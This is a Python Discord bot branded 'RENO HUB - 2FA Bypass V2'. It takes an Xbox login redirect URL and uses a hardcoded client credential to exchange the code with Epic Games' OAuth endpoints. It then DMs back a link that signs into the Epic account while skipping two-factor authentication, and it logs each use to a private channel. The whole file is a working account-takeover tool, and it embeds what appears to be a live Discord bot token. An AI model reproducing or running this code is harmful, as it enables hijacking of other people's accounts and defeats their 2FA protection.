import discord
from discord.ext import commands
from discord import app_commands
from urllib.parse import urlparse, parse_qs
import requests
import time
import webbrowser
from colorama import init, Fore
import os
from datetime import datetime

init(autoreset=True)

# Bot configuration
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Your tokens
NEW_SWITCH_TOKEN = "Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
IOSTOKEN = NEW_SWITCH_TOKEN

# Owner restriction: only this Discord user ID can use the bot
OWNER_ID = 1444315566729986209

# Allowed channel (locked to the provided channel ID)
# Channel: 1429103461349199945 (Reno Hub command channel)
ALLOWED_CHANNEL_ID = 1429103461349199945
# Bypass log channel: send a short notification when someone uses the bypass
# Channel example (bypasses channel): 1429106676367097947
LOG_CHANNEL_ID = 1429106676367097947
# Allowed guild (server) - restrict commands to a single guild
# Example: ALLOWED_GUILD_ID = 123456789012345678
ALLOWED_GUILD_ID = int(os.environ.get("ALLOWED_GUILD_ID", "1429103387655409666"))
def extract_code_and_exchange(url):
    """Extract code and perform exchange"""
    try:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if 'code' in query_params:
            code_value = query_params['code'][0]
            exchange_url = 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token'
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3'
            }
            data = {
                'grant_type': 'external_auth',
                'external_auth_type': 'xbl',
                'external_auth_token': code_value
            }
            response = requests.post(exchange_url, headers=headers, data=data)
            if response.status_code == 200:
                access_token = response.json().get('access_token')
                return access_token
            else:
                return None
        else:
            return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def exchange_and_getrealcode(access_token):
    """Exchange token for bypass code"""
    try:
        exchange_url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange'
        headers = {'Authorization': f'Bearer {access_token}'}
        response = requests.get(exchange_url, headers=headers)
        if response.status_code == 200:
            real_code = response.json().get('code')
            bypass_link = f'https://www.epicgames.com/id/exchange?exchangeCode={real_code}&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal%3Fmode%3Dgame&prompt=none'
            return bypass_link
        else:
            return None
    except Exception as e:
        print(f"Error: {e}")
        return None

@bot.event
async def on_ready():
    print(f'{bot.user} successfully logged in!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    # Ensure the bot stays only in the configured allowed guild (Reno Hub).
    for guild in list(bot.guilds):
        try:
            if guild.id != ALLOWED_GUILD_ID:
                await guild.leave()
                print(f"Left guild {guild.name} (id={guild.id}) - not the allowed guild")
            else:
                print(f"Connected to allowed guild {guild.name} (id={guild.id})")
        except Exception:
            pass


@bot.event
async def on_guild_join(guild):
    """Auto-leave guilds that are not the configured allowed guild.
    This ensures the bot stays only on the configured Reno Hub server."""
    try:
        if guild.id != ALLOWED_GUILD_ID:
            await guild.leave()
            print(f"Left guild {guild.name} (id={guild.id}) on join - not allowed")
        else:
            print(f"Joined allowed guild {guild.name} (id={guild.id})")
    except Exception:
        pass

@bot.tree.command(name="xboxtut", description="Display Xbox login tutorial")
async def xbox_tutorial(interaction: discord.Interaction):
    """Command /xboxtut - displays tutorial (only in allowed channel)"""
    # Ensure allowed channel is configured
    if ALLOWED_CHANNEL_ID == 0:
        await interaction.response.send_message("Allowed channel is not configured. Set `ALLOWED_CHANNEL_ID` in the bot file.", ephemeral=True)
        return

    # Check guild and channel
    if not interaction.guild or interaction.guild.id != ALLOWED_GUILD_ID:
        await interaction.response.send_message("This bot only operates on the Reno Hub server.", ephemeral=True)
        return

    if not interaction.channel or interaction.channel.id != ALLOWED_CHANNEL_ID:
        await interaction.response.send_message(f"This bot only operates in the designated channel <#{ALLOWED_CHANNEL_ID}>.", ephemeral=True)
        return

    embed = discord.Embed(
        title=" Xbox Tutorial",
        description="Instructions to get Xbox access token",
        color=discord.Color.purple()
    )

    embed.add_field(
        name="🔗 Step 1 — Get Xbox Login Link",
        value="[Click here: Xbox Login](https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup)",
        inline=False
    )

    embed.add_field(
        name="✅ Instructions",
        value="1. Login with your Xbox account\n2. Copy the URL from your browser address bar\n3. Use `/xblbypass` with the copied link",
        inline=False
    )

    embed.add_field(
        name="📥 Step 2 — Run the Bot Command",
        value="Use: `/xblbypass link: <your_copied_link>`",
        inline=False
    )

    embed.set_footer(text="RENO HUB - 2FA Bypass V2")

    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="xblbypass", description="Xbox 2FA Bypass")
@app_commands.describe(link="Copy the full URL from your browser")
async def xbl_bypass(interaction: discord.Interaction, link: str):
    """Command /xblbypass - performs bypass (only in allowed channel)"""
    # Ensure allowed channel is configured
    if ALLOWED_CHANNEL_ID == 0:
        await interaction.response.send_message("Allowed channel is not configured. Set `ALLOWED_CHANNEL_ID` in the bot file.", ephemeral=True)
        return

    # Check guild and channel
    if not interaction.guild or interaction.guild.id != ALLOWED_GUILD_ID:
        await interaction.response.send_message("This bot only operates on the Reno Hub server.", ephemeral=True)
        return

    if not interaction.channel or interaction.channel.id != ALLOWED_CHANNEL_ID:
        await interaction.response.send_message(f"This bot only operates in the designated channel <#{ALLOWED_CHANNEL_ID}>.", ephemeral=True)
        return

    # Defer with ephemeral so followups are only visible to the invoking user
    await interaction.response.defer(ephemeral=True)

    try:
        # Send processing message (ephemeral)
        embed_processing = discord.Embed(
            title="⏳ Processing...",
            description="Processing your link, please wait...",
            color=discord.Color.blue()
        )
        await interaction.followup.send(embed=embed_processing, ephemeral=True)

        # Exchange code
        access_token = extract_code_and_exchange(link)

        if access_token:
            # Get actual bypass code
            bypass_link = exchange_and_getrealcode(access_token)

            if bypass_link:
                # Send link to DM
                try:
                    embed_success = discord.Embed(
                        title="✅ Successfully Bypassed!",
                        description=f"[Click here to complete bypass]({bypass_link})",
                        color=discord.Color.green()
                    )
                    embed_success.add_field(
                        name="💡 What to do",
                        value="1. Click the link above\n2. Confirm the action\n3. Done!",
                        inline=False
                    )
                    embed_success.set_footer(text="RENO HUB - 2FA Bypass V2")

                    # Send bypass link via DM
                    await interaction.user.send(embed=embed_success)

                    # Confirm to the user ephemerally in channel
                    embed_dm = discord.Embed(
                        title="📧 Link sent to DM!",
                        description="Check your private messages",
                        color=discord.Color.green()
                    )
                    await interaction.followup.send(embed=embed_dm, ephemeral=True)
                    # Send a formatted embed log to the bypasses channel
                    try:
                        log_channel = bot.get_channel(LOG_CHANNEL_ID)
                        if log_channel is None:
                            # try fetching if not in cache
                            log_channel = await bot.fetch_channel(LOG_CHANNEL_ID)

                        # Create a formatted embed for the bypass log
                        now = datetime.now()
                        ts = f"{now.day}.{now.month}.{now.year} {now.hour:02d}:{now.minute:02d}"

                        log_embed = discord.Embed(
                            title="📜 Xbox Bypass Log",
                            color=discord.Color.dark_gray()
                        )
                        log_embed.add_field(
                            name="🔗 Linked Platforms",
                            value="Xbox Live",
                            inline=False
                        )
                        log_embed.add_field(
                            name="💎 Used By",
                            value=f"{interaction.user.mention} - {interaction.user.id}",
                            inline=False
                        )
                        log_embed.add_field(
                            name="🕐 Time",
                            value=ts,
                            inline=False
                        )
                        log_embed.set_footer(text="RENO HUB - 2FA Bypass V2")

                        await log_channel.send(embed=log_embed)
                    except Exception as _e:
                        print(f"Failed to send bypass log: {_e}")
                except discord.Forbidden:
                    embed_error = discord.Embed(
                        title="❌ Error",
                        description="Cannot send DM. Check your privacy settings.",
                        color=discord.Color.red()
                    )
                    await interaction.followup.send(embed=embed_error, ephemeral=True)
            else:
                embed_error = discord.Embed(
                    title="❌ Error",
                    description="Cannot exchange token. Link may be invalid or expired.",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed_error, ephemeral=True)
        else:
            embed_error = discord.Embed(
                title="❌ Error",
                description="Cannot extract code from link. Make sure you copied the full URL.",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed_error, ephemeral=True)

    except Exception as e:
        embed_error = discord.Embed(
            title="❌ System Error",
            description=f"Something went wrong: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed_error, ephemeral=True)


# Alias command: /xboxbypass -> calls the same handler as /xblbypass
@bot.tree.command(name="xboxbypass", description="Xbox 2FA Bypass (alias)")
@app_commands.describe(link="Copy the full URL from your browser")
async def xboxbypass_alias(interaction: discord.Interaction, link: str):
    await xbl_bypass(interaction, link)

@bot.tree.command(name="help", description="Display available commands")
async def help_command(interaction: discord.Interaction):
    """Command /help"""
    # Ensure allowed channel is configured
    if ALLOWED_CHANNEL_ID == 0:
        await interaction.response.send_message("Allowed channel is not configured. Set `ALLOWED_CHANNEL_ID` in the bot file.", ephemeral=True)
        return

    # Check guild and channel
    if not interaction.guild or interaction.guild.id != ALLOWED_GUILD_ID:
        await interaction.response.send_message("This bot only operates on the Reno Hub server.", ephemeral=True)
        return

    if not interaction.channel or interaction.channel.id != ALLOWED_CHANNEL_ID:
        await interaction.response.send_message(f"This bot only operates in the designated channel <#{ALLOWED_CHANNEL_ID}>.", ephemeral=True)
        return

    embed = discord.Embed(
        title="📚 RENO HUB - Available Commands",
        color=discord.Color.purple()
    )

    embed.add_field(
        name="/xboxtut",
        value="Display Xbox login tutorial",
        inline=False
    )

    embed.add_field(
        name="/xblbypass",
        value="Perform Xbox 2FA bypass (sends link to DM)",
        inline=False
    )

    embed.add_field(
        name="/help",
        value="Display this message",
        inline=False
    )

    embed.set_footer(text="RENO HUB - 2FA Bypass V2")

    await interaction.response.send_message(embed=embed)

# Running the bot
if __name__ == "__main__":
    # Read token from environment variable for safety, fallback to existing hardcoded token
    TOKEN = os.environ.get("DISCORD_TOKEN", "MTQ0ODQwOTc0MDUwMDY2ODQ4Nw.Gh0VJv.9bjbbabP97k8ZSSayrDCe9BKOMTJHGX0G_c9-8")
    bot.run(TOKEN)
